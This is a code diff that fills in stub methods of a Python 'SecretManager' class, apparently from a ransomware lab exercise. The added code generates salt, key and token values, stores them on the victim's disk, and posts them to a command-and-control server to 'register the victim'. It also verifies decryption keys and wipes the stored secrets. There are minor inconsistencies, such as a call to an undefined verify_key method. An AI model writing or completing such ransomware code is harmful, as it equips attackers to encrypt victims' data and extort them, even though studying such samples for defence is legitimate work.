@@ -50,35 +50,77 @@ class SecretManager:
         tmp = base64.b64encode(data)
         return str(tmp, "utf8")
 
-    def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
-        # register the victim to the CNC
-        URL = f"http://{self._remote_host_port}/new"
+    def post_new(self, salt: bytes, key: bytes, token: bytes) -> None:
+        # Register the victim to the CNC
+        URL = f"http://{self._remote_host_port}/new"  # Create the URL
+
+        # Create a dictionary containing the data to send in base64
         DATA = {
-            "token" : self.bin_to_b64(token),
-            "salt"  : self.bin_to_b64(salt),
-            "key"   : self.bin_to_b64(key),
+            "token": self.bin_to_b64(token),
+            "salt": self.bin_to_b64(salt),
+            "key": self.bin_to_b64(key),
         }
-        self._log.info(f"POST {URL} {DATA}")
-        R = requests.post(URL, DATA=DATA)
+
+        # Send the request
+        R = requests.post(URL, json=DATA)
+
+        # Log the request information
         self._log.info(f"POST {URL} {DATA} {R.status_code}")
+
+        # Check the status of the request
         if R.status_code != 200:
-            raise Exception("Error while registering to the CNC")   
+            self._log.error(f"Failed to send: {R.text}")
+        else:
+            self._log.info("Successfully sent")   
 
     def setup(self)->None:
-        # main function to create crypto data and register malware to cnc
-        raise NotImplemented()
+         # Generate the cryptographic components: salt, key, and token
+        self._salt, self._key, self._token = self.create()
 
-    def load(self)->None:
-        # function to load crypto data
-        raise NotImplemented()
+        # Create the storage directory for cryptographic data
+        os.makedirs(self._path, exist_ok=True)
+
+        # Save the cryptographic data in local files
+        with open(os.path.join(self._path, "salt_data.bin"), "wb") as salt_file:
+            salt_file.write(self._salt)
+        with open(os.path.join(self._path, "token_data.bin"), "wb") as token_file:
+            token_file.write(self._token)
+        
+        # Send the cryptographic data to the CNC server
+        self.post_new(self._salt, self._key, self._token)
+
+    def load_crypto_data(self) -> None:
+        # Function to load encryption data
+        # Loading encryption data
+        salt_file_path = os.path.join(self._path, "salt_data.bin")
+        token_file_path = os.path.join(self._path, "token_data.bin")
+
+        # Check for the existence of encryption data files
+        if os.path.exists(salt_file_path) and os.path.exists(token_file_path):
+            # Load encryption data
+            with open(salt_file_path, "rb") as salt_f:
+                self._salt = salt_f.read()
+            with open(token_file_path, "rb") as token_f:
+                self._token = token_f.read()
+        else:
+            self._log.info("Encryption data does not exist")
+
 
     def check_key(self, candidate_key:bytes)->bool:
         # Assert the key is valid
-        raise NotImplemented()
+        # Generate the token using the salt and the candidate_key
+        generated_token = self.perform_derivation(self._salt, candidate_key)
+        return generated_token == self._token
 
     def set_key(self, b64_key:str)->None:
-        # If the key is valid, set the self._key var for decrypting
-        raise NotImplemented()
+        candidate_key = base64.b64decode(b64_key)
+
+        if self.verify_key(candidate_key):
+            self._key = candidate_key
+            self._log.info("Key successfully set")
+        else:
+            self._log.error("Invalid key provided")
+            raise ValueError("Invalid key")
 
     def get_hex_token(self)->str:
         # Should return a string composed of hex symbole, regarding the token
@@ -96,4 +138,11 @@ class SecretManager:
 
     def clean(self):
         # remove crypto data from the target
-        raise NotImplemented()
+        self._key = secrets.token_bytes(SecretManager.KEY_LENGTH)
+        self._key = None
+        self._salt = secrets.token_bytes(SecretManager.SALT_LENGTH)
+        self._salt = None
+        self._token = secrets.token_bytes(SecretManager.TOKEN_LENGTH)
+        self._token = None
+
+
